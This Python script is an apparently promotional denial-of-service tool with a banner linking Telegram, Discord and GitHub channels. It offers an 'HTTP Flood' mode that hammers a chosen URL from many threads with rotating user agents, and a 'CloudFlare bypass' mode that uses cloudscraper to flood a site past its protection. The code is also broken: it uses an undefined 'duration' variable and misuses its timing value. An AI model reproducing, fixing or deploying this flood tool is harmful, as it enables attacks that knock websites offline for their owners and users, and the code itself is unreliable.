import threading
import datetime
import threading
import requests
import os
import random
import time
import cloudscraper

useragent = open("ua.txt").read().splitlines()

zoic = "\033[38;5;118m"
red = "\033[38;5;196m"
clear = "\033[0m"

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
          {zoic}
                     ╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗            
                     ║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝            
                     ╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩   {clear}
                    github.com/cybermads
           {zoic}╔═══════════════════════════════════{clear}
           {zoic}║{clear}  {zoic}-{clear} http     {zoic}|{clear} HTTP Flood         
           {zoic}║{clear}  {zoic}-{clear} cfb      {zoic}|{clear} CloudFlare bypass
           {zoic}╚═══════════════════════════════════{clear}

""")              
    
def layer7():
    while True:
        banner()
        select = input(f"""
╔═══[{zoic}root{clear}@{zoic}ZOIC{clear}]
╚══{zoic}>{clear} """)
         
        if select.startswith("http"):
            parts = select.split()
            if len(parts) != 4:
                print(f"usage{zoic}:{clear} {zoic}http{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}secs{clear}>")
                input()
                continue

            _, url, threads, secs = parts
            threads = int(threads)
            secs = int(secs)

            def http_attack(url, end_time):
                try:
                    while time.time() < end_time:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        requests.get(url, headers=headers, timeout=5)
                except:
                    pass
        
            def th(url, threads, secs):
                for _ in range(int(threads)):
                    try:
                        t = threading.Thread(target=http_attack, args=(url, secs))
                        t.start()
                    except:
                        pass

            th(url, threads, secs)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
                    {zoic}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear}
      {zoic}╔══════════════════════════════════{clear}
      {zoic}║{clear} METHODS{zoic}:{clear} {zoic}[{clear}HTTP{zoic}]{clear} 
      {zoic}║{clear} URL{zoic}:{clear} {zoic}[{clear}{url}{zoic}]{clear}                
      {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                   
      {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{duration}{zoic}]{clear}                     
      {zoic}╚══════════════════════════════════{clear}       
""")
            time.sleep(duration)

################################################################################################################################

        elif select.startswith("cfb"):
            parts = select.split()
            if len(parts) != 4:
                print(f"usage{zoic}:{clear} {zoic}cfb{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}secs{clear}>")
                input()
                continue

            _, url, threads, secs = parts
            threads = int(threads)
            secs = int(duration)
            
            def cloudflare(url, end_time):
                scraper = cloudscraper.create_scraper()
                try:
                    while time.time() < end_time:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        scraper.get(url, headers=headers, timeout=10)
                        scraper.head(url, headers=headers, timeout=10)
                except:
                    pass
        
            def th(url, threads, secs):
                for _ in range(int(threads)):
                    try:
                        t = threading.Thread(target=cloudflare, args=(url, secs))
                        t.start()
                    except:
                        pass

            th(url, threads, secs)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
                {zoic}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                {clear}
        {zoic}╔══════════════════════════════════{clear}
        {zoic}║{clear} METHODS{zoic}:{clear} {zoic}[{clear}CloudFlare Bypass{zoic}]{clear} 
        {zoic}║{clear} URL{zoic}:{clear} {zoic}[{clear}{url}{zoic}]{clear}                
        {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                   
        {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{duration}{zoic}]{clear}                     
        {zoic}╚══════════════════════════════════{clear}       
            """)
            time.sleep(duration)




            

if __name__ == "__main__":
    layer7()







